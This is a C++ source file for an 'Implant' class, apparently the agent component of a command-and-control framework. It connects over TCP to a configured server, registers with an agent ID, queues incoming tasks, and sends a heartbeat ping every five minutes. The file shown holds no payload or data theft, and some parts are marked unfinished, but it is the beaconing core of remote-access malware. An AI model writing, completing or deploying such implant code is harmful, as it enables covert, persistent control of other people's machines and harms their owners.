#include <string>
#include <sstream>
#include <fstream>
#include <unistd.h>
#include <thread>
#include <chrono>
#include <deque>
#include <asio.hpp>
#include <asio/ts/internet.hpp>
#include <asio/ts/buffer.hpp>

#include "implant.h"

using json = nlohmann::json;

Implant::Implant(std::string server_host, std::string server_port, std::string agent_id, bool isRunning):
    host{ std::move(server_host) },
    port{ std::move(server_port) }, 
    id{ std::move(agent_id) },
    isRunning{ std::move(isRunning) }
{
}

Implant::~Implant() {
    context.stop();
}

void Implant::beacon() {
    if (isRunning) {
        asio::error_code ec;
        asio::ip::tcp::endpoint endpoint(asio::ip::make_address(host, ec), std::stoi(port));
        asio::ip::tcp::socket socket(context); 
        asio::streambuf buf;

        std::thread t;

        socket.async_connect(endpoint, [&](const asio::error_code& error) {
            if (!error) {
                std::cout << "Connected to the server!" << std::endl;
                
                // Listen for messages, need to have equivalent to .then(), maybe just add callback to add to receive queue
                msg::receiveResponse(socket, buf, taskQueue);

                registerAgent(socket);

                t = std::thread(&Implant::heartbeat, this, std::ref(socket));
                
            } else {
                // Check for specific errors
                if (error == asio::error::connection_refused) {
                    std::cout << "Connection refused. The server may not be running." << std::endl;
                } else {
                    std::cout << "Error connecting to the server: " << error.message() << std::endl;
                }
            }
        });

        context.run();
        if (t.joinable()) {
            t.join();
        }
    }
}

void Implant::registerAgent(asio::ip::tcp::socket& socket) {
    RegisterAgent registerAgent(id);
    msg::Request registerResult = registerAgent.run();
    msg::sendRequest(socket, registerResult);
}

// TODO: make into own thread or process
void Implant::heartbeat(asio::ip::tcp::socket& socket) {
    while (isRunning) {
        PingTask ping(id);
        msg::Request pingResult = ping.run();
        msg::sendRequest(socket, pingResult);
        std::this_thread::sleep_for(std::chrono::minutes(5));
    }
}

void Implant::setRunning(bool running) { isRunning = running; }
void Implant::setId(std::string& new_agent_id) { id = new_agent_id; }